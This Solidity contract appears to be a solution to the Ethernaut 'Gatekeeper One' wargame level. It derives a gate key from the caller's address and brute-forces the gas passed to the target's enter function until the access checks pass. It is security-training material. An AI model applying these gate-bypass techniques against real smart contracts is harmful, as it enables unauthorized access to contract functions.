// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IGatekeeperOne.sol";

/**
 * @title Gatekeeper One Attack (Ethernaut Challenge Level 13 - Gatekeeper One)
 * @author Emre Tepe (@emretepedev)
 * @notice Attack contract for level 13
 * @custom:ethernaut https://ethernaut.openzeppelin.com/level/0x9b261b23cE149422DE75907C6ac0C30cEc4e652A
 * @custom:security-contact emretepedev@gmail.com
 */
contract GatekeeperOneAttack {
    /*//////////////////////////////////////////////////////////////
                                Attack
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Attack and solve the level
     * @param target Address of target contract
     */
    function attack(IGatekeeperOne target) external {
        bytes8 key = bytes8(uint64(1 + type(uint32).max + uint16(uint160(msg.sender))));
        uint256 mod = 8191;
        uint256 gasBase = 5 * mod;
        uint256 gasLimit = gasBase + mod;

        for (uint256 i = gasBase; i < gasLimit; ) {
            // solhint-disable no-empty-blocks
            try target.enter{ gas: i }(key) returns (bool res) {
                if (res) break;
            } catch Error(string memory) {
                // do nothing
            } catch Panic(uint256) {
                revert("GatekeeperOne: Call Panic error");
            } catch (bytes memory) {
                // do nothing
            }
            // solhint-enable no-empty-blocks

            unchecked {
                ++i;
            }
        }

        require(msg.sender == target.entrant(), "GatekeeperOne: Attack failed");
    }
}
